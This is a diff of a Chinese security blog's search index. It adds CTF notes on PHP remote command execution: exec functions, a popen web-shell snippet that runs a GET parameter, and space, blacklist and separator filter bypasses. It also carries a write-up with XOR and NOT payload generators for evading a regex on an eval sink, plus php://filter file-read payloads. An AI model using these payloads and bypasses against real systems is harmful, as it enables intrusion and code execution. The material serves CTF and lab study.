@@ -1,6 +1,93 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>RCE</title>
+    <url>/2022/09/30/RCE/</url>
+    <content><![CDATA[<h1 id="ctfshow-rce笔记"><a href="#ctfshow-rce笔记" class="headerlink" title="ctfshow-rce笔记"></a>ctfshow-rce笔记</h1><h2 id="PHP命令执行函数"><a href="#PHP命令执行函数" class="headerlink" title="PHP命令执行函数"></a>PHP命令执行函数</h2><ul>
+<li><p><strong>system()</strong></p>
+<p>该函数执行有回显，将执行结果输出到页面上</p>
+<p><code>&lt;?php system(&quot;whoami&quot;);?&gt;</code></p>
+</li>
+<li><p><strong>passthru()</strong></p>
+<p>该函数执行也有回显，将执行结果输出到页面上</p>
+<p><code>&lt;?php passthru(&quot;whoami&quot;);?&gt;</code></p>
+</li>
+<li><p><strong>exec()</strong></p>
+<p>该函数执行无回显，通常和<code>echo</code>一起使用，默认返回最后一行结果</p>
+<p><code>&lt;?php echo exec(&quot;whoami&quot;);?&gt;</code></p>
+</li>
+<li><p><strong>shell_exec()</strong></p>
+<p>该函数执行无回显，通常和<code>echo</code>一起使用，默认返回最后一行结果</p>
+<p><code>&lt;?php echo shell_exec(&quot;whoami&quot;);?&gt;</code></p>
+</li>
+<li><p><strong>反引号`</strong></p>
+<p>shell_exec()函数实际上是反引号`的变体，当禁用shell_exec时，反引号也不能执行</p>
+<p><strong>&lt;?php echo `whoami`;?&gt;</strong></p>
+</li>
+<li><p><strong>popen()</strong></p>
+<p>该函数需要两个参数，一个是执行的命令，另一个是指针文件的打开方式（r | w）。该函数不会直接返回执行结果，而是返回一个文件指针，但命令已成功执行。</p>
+<p><code>&lt;?php popen(&quot;whoami &gt;&gt; /1.txt&quot;, &quot;r&quot;);?&gt;</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]; </span><br><span class="line"><span class="variable">$fd</span> = popen(<span class="variable">$cmd</span>, <span class="string">&#x27;r&#x27;</span>);  <span class="comment">//popen打开一个进程通道 </span></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$s</span>=fgets(<span class="variable">$fd</span>))&#123;    <span class="comment">//从通道中取得数据</span></span><br><span class="line">print_r(<span class="variable">$s</span>);             <span class="comment">//输出数据</span></span><br><span class="line">&#125;</span><br><span class="line">pclose(<span class="variable">$fd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>proc_open()</strong></p>
+<p>该函数与popen函数类似，但是可以提供双管道</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;whoami&quot;</span>;  </span><br><span class="line"><span class="variable">$array</span> =   <span class="keyword">array</span>(  </span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>),   <span class="comment">//标准输入  </span></span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>),   <span class="comment">//标准输出内容  </span></span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>)    <span class="comment">//标准输出错误  </span></span><br><span class="line"> );  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$fd</span> = proc_open(<span class="variable">$test</span>,<span class="variable">$array</span>,<span class="variable">$pipes</span>);   <span class="comment">//打开一个进程通道  </span></span><br><span class="line"><span class="keyword">echo</span> stream_get_contents(<span class="variable">$pipes</span>[<span class="number">1</span>]);    <span class="comment">//为什么是$pipes[1]，因为是输出内容  </span></span><br><span class="line">proc_close(<span class="variable">$fd</span>);  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>pcntl_exec()</strong></p>
+<p>该函数需要两个参数，第一个参数是<strong>path</strong>，表示可执行二进制文件路径或是一个在文件第一行就指定了一个可执行文件路径标头的脚本文件。另一个参数是<strong>args</strong>，表示一个要传递给程序的字符串数组</p>
+<p>pcntl是linux下的一个扩展，需额外安装</p>
+<p><code>&lt;?php pcntl_exec(&quot;/bin/bash&quot;, arraya(&quot;whoami&quot;));?&gt;</code></p>
+</li>
+</ul>
+<h2 id="Linux查看文件命令"><a href="#Linux查看文件命令" class="headerlink" title="Linux查看文件命令"></a>Linux查看文件命令</h2><ol>
+<li><strong>more</strong>：一页一页的显示档案内容</li>
+<li><strong>less</strong>：与 more 类似</li>
+<li><strong>head</strong>：查看头几行</li>
+<li><strong>cat</strong>：从第一行开始显示</li>
+<li><strong>tac</strong>：从最后一行开始显示，可以看出 tac 是 cat 的反向显示</li>
+<li><strong>tail</strong>：查看尾几行</li>
+<li><strong>nl</strong>：显示的时候，顺便输出行号</li>
+<li><strong>od</strong>：以二进制的方式读取档案内容</li>
+<li><strong>vi</strong>：一种编辑器，这个也可以查看</li>
+<li><strong>vim</strong>：一种编辑器，这个也可以查看</li>
+<li><strong>sort</strong>：可以查看</li>
+<li><strong>uniq</strong>：可以查看</li>
+</ol>
+<h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><p><code>&lt;, &gt;, &lt;&gt;, %20(space), %09(tap), $IFS, $&#123;IFS&#125;, $IFS$9, &#123;cat,flag&#125;</code></p>
+<h2 id="正则黑名单绕过"><a href="#正则黑名单绕过" class="headerlink" title="正则黑名单绕过"></a>正则黑名单绕过</h2><h3 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h3><p>如<code>cat flag.php</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat fla*</span><br><span class="line">c?? fl?g.p??</span><br></pre></td></tr></table></figure>
+<h3 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h3><ol>
+<li><p>内联执行绕过（变量拼接）</p>
+<p><code>1;a=fl;b=ag.php;cat $a$b</code></p>
+</li>
+<li><p>使用<code>.</code>进行拼接</p>
+<p><code>(sy.(st).em)</code></p>
+</li>
+</ol>
+<h3 id="转义符绕过"><a href="#转义符绕过" class="headerlink" title="转义符绕过"></a>转义符绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c\at fl\ag</span><br><span class="line">cat fl&quot;&quot;ag</span><br></pre></td></tr></table></figure>
+<p>……</p>
+<h2 id="过滤分隔符"><a href="#过滤分隔符" class="headerlink" title="过滤分隔符"></a>过滤分隔符</h2><ol>
+<li><p>命令执行</p>
+<ul>
+<li><code>%0a</code>：换行符</li>
+<li><code>%0d</code>：回车符</li>
+<li><code>;</code>：连续指令</li>
+<li><code>|</code>：只执行后面那条命令</li>
+<li><code>||</code>：只执行前面那条命令</li>
+<li><code>&amp;</code>：两条命令都会执行</li>
+<li><code>&amp;&amp;</code>：两条命令都会执行</li>
+</ul>
+</li>
+<li><p>代码执行</p>
+<p>PHP中过滤了分号<code>;</code>，可以使用<code>?&gt;</code>来代替</p>
+</li>
+</ol>
+<h2 id="过滤括号"><a href="#过滤括号" class="headerlink" title="过滤括号"></a>过滤括号</h2><p>可以通过构造文件包含的形式读取文件</p>
+<p>payload：<code>?c=include$_GET[1];&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
+<p>分号如果被过滤则可以用<code>?&gt;</code>代替</p>
+]]></content>
+  </entry>
+  <entry>
     <title>SSRF</title>
     <url>/2022/04/04/SSRF/</url>
     <content><![CDATA[<h1 id="一、什么是SSRF"><a href="#一、什么是SSRF" class="headerlink" title="一、什么是SSRF"></a>一、什么是SSRF</h1><p>SSRF（server-side request forgery，服务端请求伪造），这是一个由攻击者构造请求，服务器发起请求的安全漏洞，就是让服务器去请求你通常请求不到的东西</p>
@@ -856,29 +943,6 @@
 <h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_61237064/article/details/123644264?spm=1001.2014.3001.5502">dc-6 靶机渗透学习</a></p>
 <p><a href="https://www.freebuf.com/articles/system/261271.html">Linux通过第三方应用提权实战总结</a></p>
 <p><a href="https://blog.csdn.net/zijiaijd/article/details/117165224">nmap提权几种方式</a></p>
-]]></content>
-      <categories>
-        <category>靶场&amp;靶机</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>靶机</tag>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Vulnhub-DC-8渗透学习</title>
-    <url>/2022/08/24/Vulnhub-DC-8/</url>
-    <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote>
-<p>攻击机：Kali-2021.3：192.168.11.132</p>
-<p>靶机：Vulnhub-DC-8：192.168.11.142</p>
-</blockquote>
-<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><p>主机探活</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.11.0/24</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Vulnhub-DC-8/1.png" alt></p>
-<p>扫描目标端口</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.11.142</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Vulnhub-DC-8/2.png" alt></p>
 ]]></content>
       <categories>
         <category>靶场&amp;靶机</category>
@@ -2831,26 +2895,36 @@
       </tags>
   </entry>
   <entry>
-    <title>2021 GUET梦极光杯</title>
-    <url>/2022/01/08/%E6%90%9E%E6%B8%97%E9%80%8F/</url>
-    <content><![CDATA[<p>有一道web题，源码如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/[A-Za-z0-9;()]/&quot;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo &quot;</span> . <span class="variable">$code</span> . <span class="string">&quot;;&quot;</span>);</span><br><span class="line">        <span class="variable">$output</span> = ob_get_contents();</span><br><span class="line">        ob_clean();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$output</span> === <span class="string">&quot;guetctf&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> getenv(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>很明显可以看到我们要构造 <strong>‘ code=guetctf ’</strong> 才能解开，但是正则表达式把所有的字母和数字都过滤掉了，因此我们要通过其他方法来进行绕过</p>
-<h3 id="一、异或"><a href="#一、异或" class="headerlink" title="一、异或"></a>一、异或</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = fopen(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[A-Za-z0-9;()]/i&#x27;</span>; <span class="comment">//可以根据题目给的正则表达式进行修改</span></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_i</span>))||preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">               &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(urldecode(<span class="variable">$a</span>)^urldecode(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (ord(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;ord(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>将上面的php脚本运行之后生成一个txt文档，里面包含了所有字符的异或构造结果 </p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(<span class="built_in">input</span>(<span class="string">&quot;\nyour input：&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure>
-<p>接着运行上面的python脚本即可，运行结果：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">your input：guetctf</span><br><span class="line">&quot;%07%08%05%08%03%08%06&quot;^&quot;%60%7d%60%7c%60%7c%60&quot;</span><br></pre></td></tr></table></figure>
-<h3 id="二、取反"><a href="#二、取反" class="headerlink" title="二、取反"></a>二、取反</h3><p>直接在命令行中运行这个php脚本即可</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">fwrite(STDOUT,<span class="string">&#x27;your input: &#x27;</span>);</span><br><span class="line"><span class="variable">$input</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN)); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*]&#x27;</span>.<span class="string">&#x27;~&#x27;</span>.urlencode(~<span class="variable">$input</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>运行结果：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">your input: guetctf</span><br><span class="line">[*]~%98%8A%9A%8B%9C%8B%99</span><br></pre></td></tr></table></figure>
+    <title>传输文件还原</title>
+    <url>/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/</url>
+    <content><![CDATA[<h1 id="一、配置环境"><a href="#一、配置环境" class="headerlink" title="一、配置环境"></a>一、配置环境</h1><p>将手机和PC连到同一子网下（如GUET-WiFi）</p>
+<p>手机IP：<code>10.33.80.238</code></p>
+<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/1.png" alt></p>
+<p>PC的IP：<code>10.33.35.83</code></p>
+<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/2.png" alt></p>
+<h1 id="二、WireShark抓包"><a href="#二、WireShark抓包" class="headerlink" title="二、WireShark抓包"></a>二、WireShark抓包</h1><p>打开WireShark，选择WLAN过滤器</p>
+<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/3.png" alt></p>
+<p>然后在过滤出resource IP是手机IP的数据包：<code>ip.src == 10.33.80.238</code></p>
+<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/4.png" alt></p>
+<p>通过QQ从手机发送一张图片给PC，此时WireShark会截获大量数据包，找到其中一个是HTTP协议的数据包</p>
+<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/5.png" alt></p>
+<p>右键单击然后选择追踪TCP流</p>
+<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/6.png" alt></p>
+<p>然后在下面展示数据的格式中选择原始数据（raw data）</p>
+<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/7.png" alt></p>
+<p>然后将这些原始数据另存为一个新文件即可</p>
+<h1 id="三、还原文件"><a href="#三、还原文件" class="headerlink" title="三、还原文件"></a>三、还原文件</h1><p>用十六进制编辑器（010 Editor）打开该文件，找到图片的十六进制文件头（FFD8FF）</p>
+<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/8.png" alt></p>
+<p>然后删除该文件头之前的所有数据</p>
+<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/9.png" alt></p>
+<p>然后保存，修改文件后缀名为图片格式（jpg）即可成功打开该图片</p>
+<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/10.png" alt></p>
 ]]></content>
       <categories>
-        <category>搞渗透</category>
+        <category>基础知识和笔记</category>
       </categories>
       <tags>
-        <tag>web</tag>
+        <tag>learn</tag>
       </tags>
   </entry>
   <entry>
@@ -2910,7 +2984,7 @@
 </tbody>
 </table>
 </div>
-<p>例如：<code>http://127.0.0.1/DVWA/vulnerabilitie/fi?page=php://filter/(read=)convert.base64-encode/resource=include.php</code></p>
+<p>例如：<code>http://127.0.0.1/DVWA/vulnerabilitie/fi?page=php://filter/read=convert.base64-encode/resource=include.php</code></p>
 <p><img src="/2022/03/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/3.png" alt></p>
 <p>base64解码即可获得php源码</p>
 <p><img src="/2022/03/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/4.png" alt></p>
@@ -2974,6 +3048,29 @@
       <tags>
         <tag>web</tag>
         <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2021 GUET梦极光杯</title>
+    <url>/2022/01/08/%E6%90%9E%E6%B8%97%E9%80%8F/</url>
+    <content><![CDATA[<p>有一道web题，源码如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/[A-Za-z0-9;()]/&quot;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo &quot;</span> . <span class="variable">$code</span> . <span class="string">&quot;;&quot;</span>);</span><br><span class="line">        <span class="variable">$output</span> = ob_get_contents();</span><br><span class="line">        ob_clean();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$output</span> === <span class="string">&quot;guetctf&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> getenv(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>很明显可以看到我们要构造 <strong>‘ code=guetctf ’</strong> 才能解开，但是正则表达式把所有的字母和数字都过滤掉了，因此我们要通过其他方法来进行绕过</p>
+<h3 id="一、异或"><a href="#一、异或" class="headerlink" title="一、异或"></a>一、异或</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = fopen(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[A-Za-z0-9;()]/i&#x27;</span>; <span class="comment">//可以根据题目给的正则表达式进行修改</span></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_i</span>))||preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">               &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(urldecode(<span class="variable">$a</span>)^urldecode(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (ord(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;ord(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>将上面的php脚本运行之后生成一个txt文档，里面包含了所有字符的异或构造结果 </p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(<span class="built_in">input</span>(<span class="string">&quot;\nyour input：&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure>
+<p>接着运行上面的python脚本即可，运行结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">your input：guetctf</span><br><span class="line">&quot;%07%08%05%08%03%08%06&quot;^&quot;%60%7d%60%7c%60%7c%60&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="二、取反"><a href="#二、取反" class="headerlink" title="二、取反"></a>二、取反</h3><p>直接在命令行中运行这个php脚本即可</p>
